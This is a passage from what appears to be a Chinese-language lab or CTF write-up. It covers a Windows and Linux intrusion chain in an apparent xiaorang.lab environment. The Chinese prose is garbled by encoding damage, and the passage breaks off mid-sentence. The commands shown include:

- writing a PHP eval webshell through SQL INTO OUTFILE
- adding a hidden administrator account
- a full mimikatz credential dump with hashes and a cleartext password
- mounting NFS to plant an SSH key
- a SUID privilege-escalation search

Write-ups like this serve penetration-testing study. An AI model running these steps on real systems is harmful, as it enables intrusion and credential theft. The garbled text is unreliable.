src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2025/png/25663185/1743077412408-35086b93-e53f-49b1-819b-68b0687e3045.png"></p><p>å†æŸ¥çœ‹æ—¥å¿—å‘ç°æ˜¯phpstudyèµ·çš„æœåŠ¡ï¼Œé‚£å°±å¾ˆå¥½ï¼Œå› ä¸ºè¿™ä¸œè¥¿æƒé™å¾ˆé«˜ï¼Œä¸€èˆ¬è¿ä¸Šå»å°±æ˜¯systemæƒé™ï¼Œä¸ç”¨udfææƒäº†</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2025/png/25663185/1743077479653-df3bd8fa-5c8c-4c95-8940-37869ef255cc.png"></p><p>å†™ğŸ</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select &quot;&lt;?php eval($_POST[1]);?&gt;&quot; into outfile &quot;C:/phpstudy_pro/WWW/1.php&quot;;</span><br></pre></td></tr></table></figure><p>å†ç”¨èšå‰‘é“¾æ¥</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2025/png/25663185/1743077641659-acf047f0-aa3e-4b02-a897-66201aa34a5d.png"></p><p>ç„¶åå»ºä¸ªç”¨æˆ·rdpä¸Šå»  </p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">net user calmsec admin@123 /add</span><br><span class="line">net localgroup administrators calmsec /add</span><br></pre></td></tr></table></figure><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2025/png/25663185/1743077721458-66d9cef3-5fe0-4987-a897-f1fe768f2ac9.png"></p><p>çŒ•çŒ´æ¡ƒæŠ“ä¸€ä¸‹hash</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mimikatz.exe &quot;privilege::debug&quot; &quot;log&quot; &quot;sekurlsa::logonpasswords&quot; &quot;exit&quot; &gt; test.txt</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">  .#####.   mimikatz 2.2.0 (x64) #19041 Sep 19 2022 17:44:08</span><br><span class="line"> .## ^ ##.  &quot;A La Vie, A L&#x27;Amour&quot; - (oe.eo)</span><br><span class="line"> ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )</span><br><span class="line"> ## \ / ##       &gt; https://blog.gentilkiwi.com/mimikatz</span><br><span class="line"> &#x27;## v ##&#x27;       Vincent LE TOUX             ( vincent.letoux@gmail.com )</span><br><span class="line">  &#x27;#####&#x27;        &gt; https://pingcastle.com / https://mysmartlogon.com ***/</span><br><span class="line"></span><br><span class="line">mimikatz(commandline) # privilege::debug</span><br><span class="line">Privilege &#x27;20&#x27; OK</span><br><span class="line"></span><br><span class="line">mimikatz(commandline) # log</span><br><span class="line">Using &#x27;mimikatz.log&#x27; for logfile : OK</span><br><span class="line"></span><br><span class="line">mimikatz(commandline) # sekurlsa::logonpasswords</span><br><span class="line"></span><br><span class="line">Authentication Id : 0 ; 8364475 (00000000:007fa1bb)</span><br><span class="line">Session           : RemoteInteractive from 2</span><br><span class="line">User Name         : calmsec</span><br><span class="line">Domain            : WIN-HAUWOLAO</span><br><span class="line">Logon Server      : WIN-HAUWOLAO</span><br><span class="line">Logon Time        : 2025/3/27 20:38:07</span><br><span class="line">SID               : S-1-5-21-2057596273-973658165-3030246172-1000</span><br><span class="line">msv :</span><br><span class="line"> [00000003] Primary</span><br><span class="line"> * Username : calmsec</span><br><span class="line"> * Domain   : WIN-HAUWOLAO</span><br><span class="line"> * NTLM     : 579da618cfbfa85247acf1f800a280a4</span><br><span class="line"> * SHA1     : 39f572eceeaa2174e87750b52071582fc7f13118</span><br><span class="line">tspkg :</span><br><span class="line">wdigest :</span><br><span class="line"> * Username : calmsec</span><br><span class="line"> * Domain   : WIN-HAUWOLAO</span><br><span class="line"> * Password : (null)</span><br><span class="line">kerberos :</span><br><span class="line"> * Username : calmsec</span><br><span class="line"> * Domain   : WIN-HAUWOLAO</span><br><span class="line"> * Password : (null)</span><br><span class="line">ssp :</span><br><span class="line">credman :</span><br><span class="line"></span><br><span class="line">Authentication Id : 0 ; 8343078 (00000000:007f4e26)</span><br><span class="line">Session           : Interactive from 2</span><br><span class="line">User Name         : DWM-2</span><br><span class="line">Domain            : Window Manager</span><br><span class="line">Logon Server      : (null)</span><br><span class="line">Logon Time        : 2025/3/27 20:38:06</span><br><span class="line">SID               : S-1-5-90-0-2</span><br><span class="line">msv :</span><br><span class="line"> [00000003] Primary</span><br><span class="line"> * Username : WIN-HAUWOLAO$</span><br><span class="line"> * Domain   : XIAORANG</span><br><span class="line"> * NTLM     : 1def6d07e0fd2c570960edeca14d3722</span><br><span class="line"> * SHA1     : 7c0bd0d107fa4c9172dce78b8008a02bf293bb4d</span><br><span class="line">tspkg :</span><br><span class="line">wdigest :</span><br><span class="line"> * Username : WIN-HAUWOLAO$</span><br><span class="line"> * Domain   : XIAORANG</span><br><span class="line"> * Password : (null)</span><br><span class="line">kerberos :</span><br><span class="line"> * Username : WIN-HAUWOLAO$</span><br><span class="line"> * Domain   : xiaorang.lab</span><br><span class="line"> * Password : b8 82 ef 5d 42 0a 24 cf 6c ac 10 fd af 50 2a 74 d5 21 11 2d 87 e8 9a 98 4a e6 26 84 78 71 92 d2 ac 69 21 40 5c 91 0e 8d 3f 4d ff cf f1 5a a7 90 9f fc 60 29 74 0f fb f9 cc e9 c4 d8 03 84 7a 29 dd e3 51 df a9 3f 5e c7 e8 3b 4e 62 82 11 de 82 a6 58 71 d0 6d 49 78 bb 83 7a b8 db 37 31 d6 5d 11 9e 26 41 1c 47 34 f9 d8 49 43 04 c0 87 6a 1d 8b b6 2f 85 0e 61 31 62 19 b7 bd 55 33 77 82 58 1a 42 4b da de d1 a7 34 63 ec 9e 55 01 94 cf a4 d2 d4 e7 a0 1f 73 f7 e2 5e 5b a4 2e 13 a4 70 ad a4 0e 34 b5 91 58 8e 24 61 92 a3 49 b6 6a 46 84 83 f9 be d3 06 14 e3 8a c6 a5 8c 22 9b 4c a5 5c 46 62 94 03 a9 e5 c2 e2 24 24 e4 27 a6 82 05 91 03 d3 2c b6 34 11 8f 37 27 9c 6a f2 34 b6 21 ae 25 c6 6c 6e 7f 81 a6 dc 07 9e 62 2c 18 37 a6 12 </span><br><span class="line">ssp :</span><br><span class="line">credman :</span><br><span class="line"></span><br><span class="line">Authentication Id : 0 ; 88154 (00000000:0001585a)</span><br><span class="line">Session           : Service from 0</span><br><span class="line">User Name         : chenglei</span><br><span class="line">Domain            : XIAORANG</span><br><span class="line">Logon Server      : WIN-DC</span><br><span class="line">Logon Time        : 2025/3/27 19:59:04</span><br><span class="line">SID               : S-1-5-21-3269458654-3569381900-10559451-1105</span><br><span class="line">msv :</span><br><span class="line"> [00000003] Primary</span><br><span class="line"> * Username : chenglei</span><br><span class="line"> * Domain   : XIAORANG</span><br><span class="line"> * NTLM     : 0c00801c30594a1b8eaa889d237c5382</span><br><span class="line"> * SHA1     : e8848f8a454e08957ec9814b9709129b7101fad7</span><br><span class="line"> * DPAPI    : 89b179dc738db098372c365602b7b0f4</span><br><span class="line">tspkg :</span><br><span class="line">wdigest :</span><br><span class="line"> * Username : chenglei</span><br><span class="line"> * Domain   : XIAORANG</span><br><span class="line"> * Password : (null)</span><br><span class="line">kerberos :</span><br><span class="line"> * Username : chenglei</span><br><span class="line"> * Domain   : XIAORANG.LAB</span><br><span class="line"> * Password : Xt61f3LBhg1</span><br><span class="line">ssp :</span><br><span class="line">credman :</span><br><span class="line"></span><br><span class="line">Authentication Id : 0 ; 53554 (00000000:0000d132)</span><br><span class="line">Session           : Interactive from 1</span><br><span class="line">User Name         : DWM-1</span><br><span class="line">Domain            : Window Manager</span><br><span class="line">Logon Server      : (null)</span><br><span class="line">Logon Time        : 2025/3/27 19:59:02</span><br><span class="line">SID               : S-1-5-90-0-1</span><br><span class="line">msv :</span><br><span class="line"> [00000003] Primary</span><br><span class="line"> * Username : WIN-HAUWOLAO$</span><br><span class="line"> * Domain   : XIAORANG</span><br><span class="line"> * NTLM     : 1def6d07e0fd2c570960edeca14d3722</span><br><span class="line"> * SHA1     : 7c0bd0d107fa4c9172dce78b8008a02bf293bb4d</span><br><span class="line">tspkg :</span><br><span class="line">wdigest :</span><br><span class="line"> * Username : WIN-HAUWOLAO$</span><br><span class="line"> * Domain   : XIAORANG</span><br><span class="line"> * Password : (null)</span><br><span class="line">kerberos :</span><br><span class="line"> * Username : WIN-HAUWOLAO$</span><br><span class="line"> * Domain   : xiaorang.lab</span><br><span class="line"> * Password : b8 82 ef 5d 42 0a 24 cf 6c ac 10 fd af 50 2a 74 d5 21 11 2d 87 e8 9a 98 4a e6 26 84 78 71 92 d2 ac 69 21 40 5c 91 0e 8d 3f 4d ff cf f1 5a a7 90 9f fc 60 29 74 0f fb f9 cc e9 c4 d8 03 84 7a 29 dd e3 51 df a9 3f 5e c7 e8 3b 4e 62 82 11 de 82 a6 58 71 d0 6d 49 78 bb 83 7a b8 db 37 31 d6 5d 11 9e 26 41 1c 47 34 f9 d8 49 43 04 c0 87 6a 1d 8b b6 2f 85 0e 61 31 62 19 b7 bd 55 33 77 82 58 1a 42 4b da de d1 a7 34 63 ec 9e 55 01 94 cf a4 d2 d4 e7 a0 1f 73 f7 e2 5e 5b a4 2e 13 a4 70 ad a4 0e 34 b5 91 58 8e 24 61 92 a3 49 b6 6a 46 84 83 f9 be d3 06 14 e3 8a c6 a5 8c 22 9b 4c a5 5c 46 62 94 03 a9 e5 c2 e2 24 24 e4 27 a6 82 05 91 03 d3 2c b6 34 11 8f 37 27 9c 6a f2 34 b6 21 ae 25 c6 6c 6e 7f 81 a6 dc 07 9e 62 2c 18 37 a6 12 </span><br><span class="line">ssp :</span><br><span class="line">credman :</span><br><span class="line"></span><br><span class="line">Authentication Id : 0 ; 996 (00000000:000003e4)</span><br><span class="line">Session           : Service from 0</span><br><span class="line">User Name         : WIN-HAUWOLAO$</span><br><span class="line">Domain            : XIAORANG</span><br><span class="line">Logon Server      : (null)</span><br><span class="line">Logon Time        : 2025/3/27 19:59:02</span><br><span class="line">SID               : S-1-5-20</span><br><span class="line">msv :</span><br><span class="line"> [00000003] Primary</span><br><span class="line"> * Username : WIN-HAUWOLAO$</span><br><span class="line"> * Domain   : XIAORANG</span><br><span class="line"> * NTLM     : 1def6d07e0fd2c570960edeca14d3722</span><br><span class="line"> * SHA1     : 7c0bd0d107fa4c9172dce78b8008a02bf293bb4d</span><br><span class="line">tspkg :</span><br><span class="line">wdigest :</span><br><span class="line"> * Username : WIN-HAUWOLAO$</span><br><span class="line"> * Domain   : XIAORANG</span><br><span class="line"> * Password : (null)</span><br><span class="line">kerberos :</span><br><span class="line"> * Username : win-hauwolao$</span><br><span class="line"> * Domain   : XIAORANG.LAB</span><br><span class="line"> * Password : b8 82 ef 5d 42 0a 24 cf 6c ac 10 fd af 50 2a 74 d5 21 11 2d 87 e8 9a 98 4a e6 26 84 78 71 92 d2 ac 69 21 40 5c 91 0e 8d 3f 4d ff cf f1 5a a7 90 9f fc 60 29 74 0f fb f9 cc e9 c4 d8 03 84 7a 29 dd e3 51 df a9 3f 5e c7 e8 3b 4e 62 82 11 de 82 a6 58 71 d0 6d 49 78 bb 83 7a b8 db 37 31 d6 5d 11 9e 26 41 1c 47 34 f9 d8 49 43 04 c0 87 6a 1d 8b b6 2f 85 0e 61 31 62 19 b7 bd 55 33 77 82 58 1a 42 4b da de d1 a7 34 63 ec 9e 55 01 94 cf a4 d2 d4 e7 a0 1f 73 f7 e2 5e 5b a4 2e 13 a4 70 ad a4 0e 34 b5 91 58 8e 24 61 92 a3 49 b6 6a 46 84 83 f9 be d3 06 14 e3 8a c6 a5 8c 22 9b 4c a5 5c 46 62 94 03 a9 e5 c2 e2 24 24 e4 27 a6 82 05 91 03 d3 2c b6 34 11 8f 37 27 9c 6a f2 34 b6 21 ae 25 c6 6c 6e 7f 81 a6 dc 07 9e 62 2c 18 37 a6 12 </span><br><span class="line">ssp :</span><br><span class="line">credman :</span><br><span class="line"></span><br><span class="line">Authentication Id : 0 ; 24165 (00000000:00005e65)</span><br><span class="line">Session           : UndefinedLogonType from 0</span><br><span class="line">User Name         : (null)</span><br><span class="line">Domain            : (null)</span><br><span class="line">Logon Server      : (null)</span><br><span class="line">Logon Time        : 2025/3/27 19:59:01</span><br><span class="line">SID               : </span><br><span class="line">msv :</span><br><span class="line"> [00000003] Primary</span><br><span class="line"> * Username : WIN-HAUWOLAO$</span><br><span class="line"> * Domain   : XIAORANG</span><br><span class="line"> * NTLM     : 1def6d07e0fd2c570960edeca14d3722</span><br><span class="line"> * SHA1     : 7c0bd0d107fa4c9172dce78b8008a02bf293bb4d</span><br><span class="line">tspkg :</span><br><span class="line">wdigest :</span><br><span class="line">kerberos :</span><br><span class="line">ssp :</span><br><span class="line">credman :</span><br><span class="line"></span><br><span class="line">Authentication Id : 0 ; 8364504 (00000000:007fa1d8)</span><br><span class="line">Session           : RemoteInteractive from 2</span><br><span class="line">User Name         : calmsec</span><br><span class="line">Domain            : WIN-HAUWOLAO</span><br><span class="line">Logon Server      : WIN-HAUWOLAO</span><br><span class="line">Logon Time        : 2025/3/27 20:38:07</span><br><span class="line">SID               : S-1-5-21-2057596273-973658165-3030246172-1000</span><br><span class="line">msv :</span><br><span class="line"> [00000003] Primary</span><br><span class="line"> * Username : calmsec</span><br><span class="line"> * Domain   : WIN-HAUWOLAO</span><br><span class="line"> * NTLM     : 579da618cfbfa85247acf1f800a280a4</span><br><span class="line"> * SHA1     : 39f572eceeaa2174e87750b52071582fc7f13118</span><br><span class="line">tspkg :</span><br><span class="line">wdigest :</span><br><span class="line"> * Username : calmsec</span><br><span class="line"> * Domain   : WIN-HAUWOLAO</span><br><span class="line"> * Password : (null)</span><br><span class="line">kerberos :</span><br><span class="line"> * Username : calmsec</span><br><span class="line"> * Domain   : WIN-HAUWOLAO</span><br><span class="line"> * Password : (null)</span><br><span class="line">ssp :</span><br><span class="line">credman :</span><br><span class="line"></span><br><span class="line">Authentication Id : 0 ; 8342695 (00000000:007f4ca7)</span><br><span class="line">Session           : Interactive from 2</span><br><span class="line">User Name         : DWM-2</span><br><span class="line">Domain            : Window Manager</span><br><span class="line">Logon Server      : (null)</span><br><span class="line">Logon Time        : 2025/3/27 20:38:06</span><br><span class="line">SID               : S-1-5-90-0-2</span><br><span class="line">msv :</span><br><span class="line"> [00000003] Primary</span><br><span class="line"> * Username : WIN-HAUWOLAO$</span><br><span class="line"> * Domain   : XIAORANG</span><br><span class="line"> * NTLM     : 1def6d07e0fd2c570960edeca14d3722</span><br><span class="line"> * SHA1     : 7c0bd0d107fa4c9172dce78b8008a02bf293bb4d</span><br><span class="line">tspkg :</span><br><span class="line">wdigest :</span><br><span class="line"> * Username : WIN-HAUWOLAO$</span><br><span class="line"> * Domain   : XIAORANG</span><br><span class="line"> * Password : (null)</span><br><span class="line">kerberos :</span><br><span class="line"> * Username : WIN-HAUWOLAO$</span><br><span class="line"> * Domain   : xiaorang.lab</span><br><span class="line"> * Password : b8 82 ef 5d 42 0a 24 cf 6c ac 10 fd af 50 2a 74 d5 21 11 2d 87 e8 9a 98 4a e6 26 84 78 71 92 d2 ac 69 21 40 5c 91 0e 8d 3f 4d ff cf f1 5a a7 90 9f fc 60 29 74 0f fb f9 cc e9 c4 d8 03 84 7a 29 dd e3 51 df a9 3f 5e c7 e8 3b 4e 62 82 11 de 82 a6 58 71 d0 6d 49 78 bb 83 7a b8 db 37 31 d6 5d 11 9e 26 41 1c 47 34 f9 d8 49 43 04 c0 87 6a 1d 8b b6 2f 85 0e 61 31 62 19 b7 bd 55 33 77 82 58 1a 42 4b da de d1 a7 34 63 ec 9e 55 01 94 cf a4 d2 d4 e7 a0 1f 73 f7 e2 5e 5b a4 2e 13 a4 70 ad a4 0e 34 b5 91 58 8e 24 61 92 a3 49 b6 6a 46 84 83 f9 be d3 06 14 e3 8a c6 a5 8c 22 9b 4c a5 5c 46 62 94 03 a9 e5 c2 e2 24 24 e4 27 a6 82 05 91 03 d3 2c b6 34 11 8f 37 27 9c 6a f2 34 b6 21 ae 25 c6 6c 6e 7f 81 a6 dc 07 9e 62 2c 18 37 a6 12 </span><br><span class="line">ssp :</span><br><span class="line">credman :</span><br><span class="line"></span><br><span class="line">Authentication Id : 0 ; 997 (00000000:000003e5)</span><br><span class="line">Session           : Service from 0</span><br><span class="line">User Name         : LOCAL SERVICE</span><br><span class="line">Domain            : NT AUTHORITY</span><br><span class="line">Logon Server      : (null)</span><br><span class="line">Logon Time        : 2025/3/27 19:59:02</span><br><span class="line">SID               : S-1-5-19</span><br><span class="line">msv :</span><br><span class="line">tspkg :</span><br><span class="line">wdigest :</span><br><span class="line"> * Username : (null)</span><br><span class="line"> * Domain   : (null)</span><br><span class="line"> * Password : (null)</span><br><span class="line">kerberos :</span><br><span class="line"> * Username : (null)</span><br><span class="line"> * Domain   : (null)</span><br><span class="line"> * Password : (null)</span><br><span class="line">ssp :</span><br><span class="line">credman :</span><br><span class="line"></span><br><span class="line">Authentication Id : 0 ; 53585 (00000000:0000d151)</span><br><span class="line">Session           : Interactive from 1</span><br><span class="line">User Name         : DWM-1</span><br><span class="line">Domain            : Window Manager</span><br><span class="line">Logon Server      : (null)</span><br><span class="line">Logon Time        : 2025/3/27 19:59:02</span><br><span class="line">SID               : S-1-5-90-0-1</span><br><span class="line">msv :</span><br><span class="line"> [00000003] Primary</span><br><span class="line"> * Username : WIN-HAUWOLAO$</span><br><span class="line"> * Domain   : XIAORANG</span><br><span class="line"> * NTLM     : b5cd3591a58e1169186bcdbfd4b6322d</span><br><span class="line"> * SHA1     : 226ee6b5e527e5903988f08993a2456e3297ee1f</span><br><span class="line">tspkg :</span><br><span class="line">wdigest :</span><br><span class="line"> * Username : WIN-HAUWOLAO$</span><br><span class="line"> * Domain   : XIAORANG</span><br><span class="line"> * Password : (null)</span><br><span class="line">kerberos :</span><br><span class="line"> * Username : WIN-HAUWOLAO$</span><br><span class="line"> * Domain   : xiaorang.lab</span><br><span class="line"> * Password : `k+hcEDFvtzoObj=&gt;DvzxiNqwyEn;Eu-\zFVAh&gt;.G0u%BqQ21FskHtJlW4)3is3V;7Iu)3B00kd1##IB&#x27;LLG6wSx6TR%m;`Nfr;;Hf8O&#x27;Szfl0Z=w+^,&gt;0jR</span><br><span class="line">ssp :</span><br><span class="line">credman :</span><br><span class="line"></span><br><span class="line">Authentication Id : 0 ; 999 (00000000:000003e7)</span><br><span class="line">Session           : UndefinedLogonType from 0</span><br><span class="line">User Name         : WIN-HAUWOLAO$</span><br><span class="line">Domain            : XIAORANG</span><br><span class="line">Logon Server      : (null)</span><br><span class="line">Logon Time        : 2025/3/27 19:59:01</span><br><span class="line">SID               : S-1-5-18</span><br><span class="line">msv :</span><br><span class="line">tspkg :</span><br><span class="line">wdigest :</span><br><span class="line"> * Username : WIN-HAUWOLAO$</span><br><span class="line"> * Domain   : XIAORANG</span><br><span class="line"> * Password : (null)</span><br><span class="line">kerberos :</span><br><span class="line"> * Username : win-hauwolao$</span><br><span class="line"> * Domain   : XIAORANG.LAB</span><br><span class="line"> * Password : b8 82 ef 5d 42 0a 24 cf 6c ac 10 fd af 50 2a 74 d5 21 11 2d 87 e8 9a 98 4a e6 26 84 78 71 92 d2 ac 69 21 40 5c 91 0e 8d 3f 4d ff cf f1 5a a7 90 9f fc 60 29 74 0f fb f9 cc e9 c4 d8 03 84 7a 29 dd e3 51 df a9 3f 5e c7 e8 3b 4e 62 82 11 de 82 a6 58 71 d0 6d 49 78 bb 83 7a b8 db 37 31 d6 5d 11 9e 26 41 1c 47 34 f9 d8 49 43 04 c0 87 6a 1d 8b b6 2f 85 0e 61 31 62 19 b7 bd 55 33 77 82 58 1a 42 4b da de d1 a7 34 63 ec 9e 55 01 94 cf a4 d2 d4 e7 a0 1f 73 f7 e2 5e 5b a4 2e 13 a4 70 ad a4 0e 34 b5 91 58 8e 24 61 92 a3 49 b6 6a 46 84 83 f9 be d3 06 14 e3 8a c6 a5 8c 22 9b 4c a5 5c 46 62 94 03 a9 e5 c2 e2 24 24 e4 27 a6 82 05 91 03 d3 2c b6 34 11 8f 37 27 9c 6a f2 34 b6 21 ae 25 c6 6c 6e 7f 81 a6 dc 07 9e 62 2c 18 37 a6 12 </span><br><span class="line">ssp :</span><br><span class="line">credman :</span><br><span class="line"></span><br><span class="line">mimikatz(commandline) # exit</span><br><span class="line">Bye!</span><br></pre></td></tr></table></figure><h2 id="NFSæŒ‚è½½"><a href="#NFSæŒ‚è½½" class="headerlink" title="NFSæŒ‚è½½"></a>NFSæŒ‚è½½</h2><p>é¢˜ç›®è¯´äº†nfs</p><p>14é‚£å°æœºå™¨å…ˆæ›´æ–°ä¸€ä¸‹ä¾èµ–</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">sudo sed -i &#x27;s/archive.ubuntu.com/mirrors.aliyun.com/g&#x27; /etc/apt/sources.list</span><br><span class="line">sudo apt-get update</span><br><span class="line">apt-get install nfs-common -y</span><br></pre></td></tr></table></figure><p>å†æŒ‚è½½nfs</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">cd / </span><br><span class="line">mkdir temp </span><br><span class="line">mount -t nfs 172.22.13.57:/ ./temp -o nolock</span><br></pre></td></tr></table></figure><p>å‘ç°åªæœ‰</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2025/png/25663185/1743078216400-83457089-775c-4b8c-b770-dffbbd34a243.png"></p><p>å†™å…¬é’¥è¿ä¸Šå»</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">ssh-keygen </span><br><span class="line">cd /temp/home/joyce/ </span><br><span class="line">mkdir .ssh </span><br><span class="line">cat /root/.ssh/id_rsa.pub &gt;&gt; /temp/home/joyce/.ssh/authorized_keys </span><br><span class="line">ssh -i /root/.ssh/id_rsa joyce@172.22.13.57</span><br></pre></td></tr></table></figure><p>å‘ç°æ²¡æœ‰æƒé™</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2025/png/25663185/1743078343650-6108ca30-785c-4ba0-bc09-f1eb1e0f0a79.png"></p><p>æ‰¾æ‰¾ææƒï¼Œææƒæ¢é’ˆ</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">find / -user root -perm -4000 -exec ls -ldb &#123;&#125; \;</span><br></pre></td></tr></table></figure><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2025/png/25663185/1743078400695-624390fa-f534-4dbf-8122-bd3b69aba365.png"></p><h2 id="ftpææƒ"><a href="#ftpææƒ" class="headerlink" title="ftpææƒ"></a>ftpææƒ</h2><p>æˆ‘ä»¬èƒ½æŠŠflagä¼ åˆ°ftpé‡Œï¼Œæœ€åˆæˆ‘ä»¬è·å¾—çš„æœºå™¨é‡Œé‚£ä¸ªftpæœåŠ¡æ²¡æƒé™ä¼ 